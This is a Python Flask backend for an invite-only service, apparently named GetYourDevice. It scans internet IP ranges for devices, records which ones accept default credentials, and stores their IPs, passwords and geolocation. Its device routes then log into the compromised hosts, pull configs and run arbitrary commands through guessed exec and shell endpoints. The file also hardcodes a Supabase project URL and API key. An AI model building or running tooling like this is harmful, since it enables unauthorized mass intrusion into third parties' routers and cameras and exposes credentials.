import os, json, uuid
from datetime import datetime, timezone
from functools import wraps
from flask import Flask, render_template, request, jsonify
from dotenv import load_dotenv

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
load_dotenv(os.path.join(BASE_DIR, '.env'))
app = Flask(__name__, template_folder=os.path.join(BASE_DIR, 'templates'))

SUPABASE_URL = os.environ.get("SUPABASE_URL", "https://fhlrvzhwjuepftwwnmtm.supabase.co")
SUPABASE_ANON_KEY = os.environ.get("SUPABASE_ANON_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZobHJ2emh3anVlcGZ0d3dubXRtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIwNzIwNTcsImV4cCI6MjA5NzY0ODA1N30.8J9W654hvfn3oFHdv4M0yyeQeyWUOWuTEM6Dw6Ri5-M")
SUPABASE_SERVICE_ROLE_KEY = os.environ.get("SUPABASE_SERVICE_ROLE_KEY", "")

use_service_role = bool(SUPABASE_SERVICE_ROLE_KEY)
supabase_key = SUPABASE_SERVICE_ROLE_KEY if use_service_role else SUPABASE_ANON_KEY

supabase = None
if SUPABASE_URL and supabase_key:
    from supabase import create_client
    try:
        supabase = create_client(SUPABASE_URL, supabase_key)
    except Exception as e:
        print(f"[!] Supabase init error: {e}")

INVITE_ONLY = os.environ.get("INVITE_ONLY", "true").lower() == "true"

def get_supabase():
    return supabase

def verify_token(token):
    if not supabase:
        return None
    try:
        resp = supabase.auth.get_user(token)
        return resp.user
    except:
        return None

def ensure_user(uid, email):
    """Create public.users row if missing (backup for trigger)."""
    if not supabase:
        return
    try:
        existing = supabase.table("users").select("id").eq("id", uid).limit(1).execute()
        if not existing.data:
            username = email.split("@")[0] if email else uid[:8]
            supabase.table("users").insert({
                "id": uid, "email": email, "username": username,
            }).execute()
    except:
        pass

def get_user_by_token():
    auth_h = request.headers.get("Authorization", "")
    if not auth_h.startswith("Bearer "):
        return None
    return verify_token(auth_h[7:])

def require_auth(f):
    @wraps(f)
    def wrapper(*a, **kw):
        user = get_user_by_token()
        if not user:
            return jsonify({"error": "unauthorized"}), 401
        return f(user=user, *a, **kw)
    return wrapper

# ─────────────── Auth routes ───────────────

@app.route("/api/auth/login", methods=["POST"])
def api_login():
    body = request.get_json(force=True)
    token = body.get("access_token", "")
    if not token:
        return jsonify({"error": "access_token required"}), 400
    user = verify_token(token)
    if not user:
        return jsonify({"error": "invalid token"}), 401
    uid = user.id
    email = user.email or ""
    username = email.split("@")[0]
    ensure_user(uid, email)
    try:
        resp = supabase.table("users").select("*").eq("id", uid).limit(1).execute()
        if resp.data:
            username = resp.data[0].get("username", username)
            email = resp.data[0].get("email", email)
    except:
        pass
    return jsonify({"status": "ok", "token": token, "user": {"email": email, "username": username, "uid": uid}})

@app.route("/api/auth/register", methods=["POST"])
def api_register():
    body = request.get_json(force=True)
    invite = body.get("invite_code", "").strip()
    token = body.get("access_token", "")

    if not token:
        return jsonify({"error": "access_token required"}), 400

    user = verify_token(token)
    if not user:
        return jsonify({"error": "invalid token"}), 401

    uid = user.id
    email = user.email or ""
    username = email.split("@")[0]

    if INVITE_ONLY:
        if not invite:
            return jsonify({"error": "invitation code required"}), 400
        try:
            inv = supabase.table("invite_codes").select("*").eq("code", invite).eq("status", "active").limit(1).execute()
            if not inv.data:
                return jsonify({"error": "invalid or used invitation code"}), 400
        except Exception as e:
            return jsonify({"error": f"invite check failed: {e}"}), 500

    try:
        existing = supabase.table("users").select("*").eq("id", uid).limit(1).execute()
        if existing.data:
            return jsonify({"error": "user already registered"}), 409
        supabase.table("users").upsert({
            "id": uid, "email": email, "username": username,
            "avatar_url": "", "bio": "", "created_at": datetime.now(timezone.utc).isoformat(),
        }).execute()
    except Exception as e:
        return jsonify({"error": f"user creation failed: {e}"}), 500

    if INVITE_ONLY and invite and inv.data:
        inv_id = inv.data[0]["id"]
        supabase.table("invite_codes").update({
            "status": "used", "used_by": uid, "used_at": datetime.now(timezone.utc).isoformat()
        }).eq("id", inv_id).execute()

    return jsonify({"status": "ok", "token": token, "user": {"email": email, "username": username, "uid": uid}})

@app.route("/api/auth/me", methods=["GET"])
@require_auth
def api_me(user):
    return jsonify({"user": {"email": user.email, "uid": user.id, "username": user.email.split("@")[0]}})

@app.route("/api/auth/logout", methods=["POST"])
def api_logout():
    return jsonify({"status": "ok"})

@app.route("/api/auth/check-invite", methods=["GET"])
def api_check_invite():
    code = request.args.get("code", "")
    if not code:
        return jsonify({"valid": False}), 400
    if not INVITE_ONLY:
        return jsonify({"valid": True})
    try:
        inv = supabase.table("invite_codes").select("*").eq("code", code).eq("status", "active").limit(1).execute()
        return jsonify({"valid": len(inv.data) > 0})
    except:
        return jsonify({"valid": False})

# ─────────────── Scan results ───────────────

@app.route("/api/results", methods=["GET"])
@require_auth
def api_list_results(user):
    try:
        resp = supabase.table("scan_results").select("*").eq("user_id", user.id).order("created_at", desc=True).limit(100).execute()
        out = []
        for r in resp.data:
            r["id"] = str(r["id"])
            out.append(r)
        return jsonify(out)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>", methods=["GET"])
@require_auth
def api_get_result(user, result_id):
    try:
        resp = supabase.table("scan_results").select("*").eq("id", result_id).eq("user_id", user.id).limit(1).execute()
        if not resp.data:
            return jsonify({"error": "not found"}), 404
        data = resp.data[0]
        data["id"] = str(data["id"])
        return jsonify(data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>", methods=["DELETE"])
@require_auth
def api_delete_result(user, result_id):
    try:
        supabase.table("scan_result_items").delete().eq("result_id", result_id).execute()
        supabase.table("scan_results").delete().eq("id", result_id).eq("user_id", user.id).execute()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>/items", methods=["GET"])
@require_auth
def api_result_items(user, result_id):
    try:
        resp = supabase.table("scan_result_items").select("*").eq("result_id", result_id).order("item_index").execute()
        out = []
        for r in resp.data:
            r["id"] = int(r.get("item_index", 0))
            out.append(r)
        return jsonify(out)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/results/<result_id>/items/broken", methods=["GET"])
@require_auth
def api_broken_items(user, result_id):
    try:
        resp = supabase.table("scan_result_items").select("*").eq("result_id", result_id).eq("broken", True).execute()
        out = []
        for r in resp.data:
            r["id"] = int(r.get("item_index", 0))
            out.append(r)
        return jsonify(out)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ─────────────── Device interaction ───────────────

@app.route("/api/devices/<item_id>/test", methods=["POST"])
@require_auth
def api_test_device(user, item_id):
    import requests as http_req
    try:
        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
        if not resp.data:
            return jsonify({"error": "not found"}), 404
        item = resp.data[0]
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    ip = item.get("ip", "")
    port = item.get("port", 80)
    username = item.get("username", "admin")
    password = item.get("password", "admin")
    scheme = "https" if port in (443, 8443, 9443) else "http"
    item_uuid = item["id"]

    result = {"status": "error", "message": ""}
    try:
        r = http_req.get(f"{scheme}://{ip}:{port}", auth=(username, password),
                         timeout=10, allow_redirects=False, verify=False)
        result["status_code"] = r.status_code
        result["headers"] = dict(r.headers)
        result["body_preview"] = r.text[:2000]
        if r.status_code in (200, 301, 302):
            result["status"] = "ok"
            result["message"] = "Credentials work"
            supabase.table("scan_result_items").update({"broken": True, "broken_at": datetime.now(timezone.utc).isoformat()}).eq("id", item_uuid).execute()
        else:
            result["message"] = f"HTTP {r.status_code}"
    except Exception as e:
        result["message"] = str(e)[:200]
    return jsonify(result)

@app.route("/api/devices/<item_id>/access", methods=["POST"])
@require_auth
def api_access_device(user, item_id):
    import requests as http_req
    try:
        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
        if not resp.data or not resp.data[0].get("broken"):
            return jsonify({"error": "device not found or not broken yet"}), 404
        item = resp.data[0]
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    body = request.get_json(force=True) or {}
    action = body.get("action", "info")
    ip = item["ip"]
    port = item["port"]
    u = item.get("username", "admin")
    p = item.get("password", "admin")
    scheme = "https" if port in (443, 8443, 9443) else "http"

    result = {"status": "error", "message": ""}
    try:
        if action == "info":
            r = http_req.get(f"{scheme}://{ip}:{port}", auth=(u, p), timeout=10, verify=False)
            result = {"status": "ok", "status_code": r.status_code, "headers": dict(r.headers), "body": r.text[:5000]}
        elif action == "exec":
            cmd = body.get("command", "id")
            r = http_req.get(f"{scheme}://{ip}:{port}/cgi-bin/exec?cmd={cmd}", auth=(u, p), timeout=10, verify=False)
            result = {"status": "ok", "output": r.text[:5000]}
        elif action == "config":
            r = http_req.get(f"{scheme}://{ip}:{port}/config", auth=(u, p), timeout=10, verify=False)
            result = {"status": "ok", "config": r.text[:5000]}
        elif action == "shell":
            cmd = body.get("command", "id")
            for ep in ["/exec", "/cgi-bin/exec", "/shell", "/cmd", "/console"]:
                try:
                    r = http_req.get(f"{scheme}://{ip}:{port}{ep}?cmd={cmd}", auth=(u, p), timeout=5, verify=False)
                    if r.status_code == 200:
                        result = {"status": "ok", "endpoint": ep, "output": r.text[:5000]}
                        break
                except:
                    continue
            if result.get("status") != "ok":
                result = {"status": "ok", "message": "No shell endpoint found, creds work", "suggested_url": f"{scheme}://{ip}:{port}"}
        else:
            result = {"error": f"unknown action: {action}"}
    except Exception as e:
        result["message"] = str(e)[:200]
    return jsonify(result)

# ─────────────── Scan API ───────────────

@app.route("/api/scan", methods=["POST"])
@require_auth
def api_scan(user):
    body = request.get_json(force=True)
    target = body.get("target", "")
    region = body.get("region", "")
    internet = body.get("internet", False)
    max_ips = int(body.get("max_ips", 500))
    threads = int(body.get("threads", 10))
    ports = body.get("ports", "fast")
    country = body.get("country", None)
    do_geo = body.get("geo", False)

    from GetYourDevice import (
        generate_region_ips, generate_internet_ips, generate_ips,
        scan_single, SCAN_PORTS, ALL_PORTS, GeoEnricher, REGION_CONFIG
    )

    selected_ports = ALL_PORTS if ports == "all" else SCAN_PORTS
    cap = min(max_ips, 5000)

    include_countries = None
    if country:
        include_countries = set(c.strip().upper() for c in country.split(",") if c.strip())

    if region and region in REGION_CONFIG:
        ips = generate_region_ips(region, cap, include_countries=include_countries)
    elif target:
        ips = generate_ips(target, cap)
    else:
        ips = generate_internet_ips(cap)

    results = []
    for ip in ips:
        try:
            res = scan_single(ip, no_auth_only=False, ports=selected_ports)
            if res:
                results.extend(res)
        except Exception:
            pass

    if do_geo and results:
        geo_ips = list(set(r["ip"] for r in results))
        geo_data = GeoEnricher.enrich_batch(geo_ips)
        for r in results:
            g = geo_data.get(r["ip"], {})
            r.update(g)

    uid = user.id
    creds_count = sum(1 for r in results if r.get("auth_found"))
    open_count = sum(1 for r in results if r.get("no_auth"))

    if results:
        try:
            scan_resp = supabase.table("scan_results").insert({
                "user_id": uid,
                "total_scanned": len(ips),
                "results_count": len(results),
                "creds_count": creds_count,
                "open_count": open_count,
                "region": region or "internet",
                "ports": ports,
                "created_at": datetime.now(timezone.utc).isoformat(),
            }).execute()
            result_id = scan_resp.data[0]["id"]
            items = []
            for i, r in enumerate(results):
                items.append({
                    "result_id": str(result_id),
                    "item_index": i,
                    "ip": r.get("ip"), "port": r.get("port"),
                    "url": r.get("url"), "device": r.get("device"),
                    "no_auth": r.get("no_auth"), "auth_found": r.get("auth_found"),
                    "username": r.get("username"), "password": r.get("password"),
                    "note": r.get("note"), "status_code": r.get("status_code"),
                    "country": r.get("country"), "country_code": r.get("country_code"),
                    "region_name": r.get("region"), "city": r.get("city"),
                    "lat": r.get("lat"), "lon": r.get("lon"),
                    "org": r.get("org"), "isp": r.get("isp"),
                    "as_info": r.get("as"),
                    "broken": False,
                })
            supabase.table("scan_result_items").insert(items).execute()
        except Exception as e:
            print(f"[!] DB save error: {e}")

    return jsonify({
        "status": "ok",
        "total_scanned": len(ips),
        "results_count": len(results),
        "results": results,
    })

# ─────────────── Invite code management ───────────────

@app.route("/api/admin/invites", methods=["GET"])
@require_auth
def api_list_invites(user):
    try:
        resp = supabase.table("invite_codes").select("*").order("created_at", desc=True).execute()
        for r in resp.data:
            r["id"] = str(r["id"])
        return jsonify(resp.data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/admin/invites", methods=["POST"])
@require_auth
def api_create_invite(user):
    code = uuid.uuid4().hex[:8].upper()
    try:
        supabase.table("invite_codes").insert({
            "code": code, "status": "active", "issuer": user.id,
        }).execute()
        return jsonify({"status": "ok", "code": code})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ─────────────── Main route ───────────────

@app.route("/")
def index():
    return render_template("app.html")

@app.route("/app")
def app_spa():
    return render_template("app.html")

@app.route("/api/health")
def api_health():
    return jsonify({
        "status": "ok",
        "time": datetime.now(timezone.utc).isoformat(),
        "version": "7.1",
        "supabase": bool(supabase),
        "invite_only": INVITE_ONLY,
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    debug = os.environ.get("VERCEL") != "1"
    print(f"[*] GYD on Supabase — http://0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, debug=debug)
